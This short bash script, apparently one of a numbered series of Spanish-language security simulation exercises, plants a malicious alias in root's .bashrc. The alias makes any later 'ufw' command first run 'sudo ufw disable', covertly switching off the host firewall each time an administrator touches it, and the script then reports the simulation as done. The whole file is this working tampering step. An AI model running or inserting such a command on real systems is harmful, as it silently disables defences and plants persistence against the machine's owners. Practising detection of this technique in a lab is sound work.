#!/bin/bash
# Ejercicio 12: Inyección de Alias Maliciosos en el Usuario Root
# Altera el archivo de configuración interactivo de root
echo "alias ufw='sudo ufw disable && command ufw'" >> /root/.bashrc
echo "Simulación 12 completada."
